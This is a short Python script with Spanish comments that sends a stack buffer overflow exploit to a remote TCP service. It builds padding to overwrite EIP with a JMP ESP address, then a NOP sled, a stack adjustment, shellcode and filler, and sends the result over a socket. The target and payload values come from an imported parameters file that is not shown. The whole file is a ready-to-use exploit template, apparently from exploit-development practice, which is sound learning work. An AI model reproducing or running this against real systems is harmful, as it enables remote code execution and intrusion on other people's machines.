#!/usr/bin/python3
import socket, struct, sys
from parameters import rhost, rport, timeout, offsetEIP, offsetESP, buffer, jmpESP, upESP, shellcode
from colors import colors

try:
    # conexión
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((rhost, rport))
    s.recv(1024)

    print(colors.Green + "\nEnviando exploit..." + colors.End)

    buf = b''
    buf += b'A'*(offsetEIP - len(buf))          # offset EIP
    buf += struct.pack("<I", jmpESP)          	# sobrescribir EIP con "JMP ESP"
    buf += b'\x90'*(offsetESP - offsetEIP - 4)  # padding entre EIP and ESP
    buf += upESP                    	        # sube ESP en la pila para evitar sobrescritura
    buf += shellcode                    	    # shellcode
    buf += b'D'*(buffer - len(buf))             # relleno de padding

    # exploit
    s.send(buf + b'\r\n')
    s.recv(1024)

except Exception as error:
    print(colors.Red + '\n[!] Ha ocurrido un error:', str(error) + colors.End)
    sys.exit(0)
    
finally:
    # cierre de conexión
    s.close()